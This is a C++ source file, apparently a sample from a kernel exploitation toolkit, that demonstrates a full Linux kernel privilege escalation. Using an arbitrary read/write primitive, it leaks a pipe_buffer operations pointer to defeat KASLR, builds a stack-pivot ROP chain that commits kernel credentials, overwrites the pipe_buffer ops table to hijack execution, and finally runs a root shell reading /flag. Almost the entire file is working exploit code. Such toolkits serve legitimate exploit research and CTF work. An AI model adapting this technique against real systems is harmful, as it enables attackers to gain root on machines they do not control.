#include <stdio.h>

#include <cassert>
#include <cerrno>
#include <target/TargetDb.hpp>
#include <test/kpwn/Kpwn.cpp>
#include <util/incbin.hpp>
#include <util/syscalls.cpp>
#include <util/error.cpp>
#include <util/pwn_utils.cpp>
#include <payloads/Payload.hpp>
#include <payloads/RopChain.hpp>
#include <util/HexDump.cpp>
#include <util/ArgumentParser.cpp>
#include <rip/RopUtils.cpp>
#include <pivot/PivotFinder.cpp>
#include <payloads/PayloadBuilder.hpp>

// ugly hack to include cpp files into compilation until we make a proper build system
#include "build_hack.h"

INCBIN(target_db, "target_db.kpwn");

typedef struct pipe_buf_operations {
    uint64_t confirm; /*     0     8 */
    uint64_t release; /*     8     8 */
    uint64_t try_steal; /*    16     8 */
    uint64_t get; /*    24     8 */
    /* size: 32, cachelines: 1, members: 4 */
} pipe_buf_operations;

typedef struct pipe_buffer {
    uint64_t page;       /*     0     8 */
    uint32_t offset;     /*     8     4 */
    uint32_t len;        /*    12     4 */
    uint64_t ops;        /*    16     8 */
    uint32_t flags;      /*    24     4 */
    uint64_t private_;   /*    32     8 */
    /* size: 40, cachelines: 1, members: 6 */
} pipe_buffer;

Kpwn kpwn;

uint64_t alloc_victim_pipe(pipefds pipefds) {
    auto pipeMallocLog = kpwn.InstallKprobe("__kmalloc", 1, CALL_LOG, "create_pipe_files");

    Syscalls::pipe(pipefds);
    write(pipefds[1], "pwn", 3);

    auto callLogs = pipeMallocLog->GetCallLogs(true);
    if (callLogs.size() != 1)
        throw ExpKitError("expected one pipe() malloc call");
    uint64_t pipe_addr = callLogs[0].return_value;
    kpwn.RemoveKprobe(pipeMallocLog);

    return pipe_addr;
}

std::vector<uint8_t> trigger_vuln_arb_read(uint64_t addr, uint64_t size) {
    return kpwn.Read(addr, size);
}

void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
    kpwn.Write(addr, data);
}

void win() {
    puts("[+] Returned from kernel");
    puts("[+] Testing access as root:");
    const char *sh_args[] = {"sh", "-c", "id; cat /flag", NULL};
    int ret = execve("/bin/sh", (char**)sh_args, NULL);
    printf("[-] execve failed ret = %d, errno = %d, exiting...\n", ret, errno);
    _exit(1);
}

int main(int argc, const char** argv) {
    TargetDb kpwn_db(target_db, target_db_size);
    auto target = kpwn_db.AutoDetectTarget();
    printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());

    pipefds fds;
    printf("[+] Creating victim pipe...\n");
    auto victim_pipe_addr = alloc_victim_pipe(fds);
    printf("[+] Victim pipe address = 0x%lx\n", victim_pipe_addr);

    auto pipe_leak = trigger_vuln_arb_read(victim_pipe_addr, sizeof(pipe_buffer));
    pipe_buffer leaked_pipe = *(pipe_buffer*) pipe_leak.data();
    printf("[+] Leaked anon_pipe_buf_ops = 0x%lx\n", leaked_pipe.ops);

    auto kaslr_base = leaked_pipe.ops - target.GetSymbolOffset("anon_pipe_buf_ops");
    printf("[+] KASLR base = 0x%lx\n", kaslr_base);
    check_kaslr_base(kaslr_base);

    Payload payload(1024);
    PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
    auto ret_addr = kaslr_base + pivot_finder.GetSingleRet().address;

    printf("[+] ROP chain:\n");
    RopChain rop(target, kaslr_base);

    // TODO: hack: fix this
    RopAction fake_action;
    for (int i = 0; i < 40; i++)
        fake_action.values.push_back(ret_addr);
    rop.actions_.push_back(fake_action);

    rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
    RopUtils::Ret2Usr(rop, (void*)win);
    rop.Add(0xffffffff41414141);
    HexDump::Print(rop.GetData());

    printf("[+] Preparing fake pipe_buffer and ops\n");

    uint64_t release_offs = offsetof(pipe_buf_operations, release);
    uint64_t fake_ops_offs = offsetof(pipe_buffer, flags) - release_offs;
    payload.Set(offsetof(pipe_buffer, ops), victim_pipe_addr + fake_ops_offs);
    //#define MANUAL 1
    #ifdef MANUAL

    auto rip_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);

    PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
    auto rop_pivot = pivot_finder.PivotToRop(rop);
    rop_pivot.PrintDebugInfo();
    *rip_ptr = kaslr_base + rop_pivot.pivot.GetGadgetOffset();

    #else
    PayloadBuilder builder(target.pivots, kaslr_base); // create builder
    uint64_t rip_off = fake_ops_offs + release_offs;
    builder.AddPayload(payload, Register::RSI, rip_off); // add payload, with register, and rip_offset
    builder.AddRopChain(rop); // add a rop chain
    if(!builder.Build()) exit(-1); // build it

    builder.PrintDebugInfo();
    #endif

    printf("[+] Payload:\n");
    HexDump::Print(payload.GetUsedData());

    printf("[+] Triggering ARB write\n");
    trigger_vuln_arb_write(victim_pipe_addr, payload.GetUsedData());

    printf("[+] Testing access as non-root user:\n");
    system("id; cat /flag");

    printf("[+] Closing pipes\n");
    close(fds[0]);
    close(fds[1]);
    return 0;
}
